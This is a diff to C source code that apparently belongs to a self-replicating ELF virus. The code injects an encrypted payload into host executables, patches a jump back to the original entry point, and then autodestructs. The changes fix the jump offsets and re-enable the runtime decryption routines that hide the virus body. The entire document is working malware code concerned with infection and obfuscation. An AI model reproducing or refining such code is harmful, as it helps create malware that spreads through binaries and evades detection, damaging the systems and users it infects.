@@ -177,11 +177,11 @@ __attribute__((always_inline)) static inline void write_on_memory(const struct s
 __attribute__((always_inline)) static inline void replicate_on_memory(const struct s_host *host, char *ptr)
 {
 	char jmp[] = {0xe9, 0x0, 0x0, 0x0, 0x0};
-	const Elf64_Addr entry_point = host->old_entry - host->new_entry - (PAYLOAD_SIZE - 375);
+	const Elf64_Addr entry_point = host->old_entry - host->new_entry - (PAYLOAD_SIZE - 363);
 
 	_memcpy(ptr + host->note->self->p_offset, __entry, PAYLOAD_SIZE);
 	_memcpy(jmp + 1, &entry_point, sizeof(int));
-	_memcpy(ptr + host->note->self->p_offset + (PAYLOAD_SIZE - 380), jmp, sizeof(jmp));
+	_memcpy(ptr + host->note->self->p_offset + (PAYLOAD_SIZE - 368), jmp, sizeof(jmp));
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -190,7 +190,7 @@ __attribute__((always_inline)) static inline void replicate_on_memory(const stru
 
 void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
 {
-//	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
+	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
 
 #if DEBUG
 	char function[] = "injection:\t\t";
@@ -226,7 +226,7 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 
 	write_on_memory(host, ptr);
 	replicate_on_memory(host, ptr);
-//	decrypt_left(keychain, ptr + host->note->self->p_offset + ((void *)injection - (void *)__entry), (void *)autodestruction - (void *)injection);
+	decrypt_left(keychain, ptr + host->note->self->p_offset + ((void *)injection - (void *)__entry), (void *)autodestruction - (void *)injection);
 
 	if ((fd = _open(host->filename, O_RDWR | O_TRUNC, 0000)) < 0)
 	{
@@ -241,7 +241,7 @@ void injection(struct s_host *host, struct s_keychain *keychain, enum e_context 
 
 label:
 	update_keychain_right(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
-//	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
+	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
 
 	autodestruction(host, keychain, context);
 }
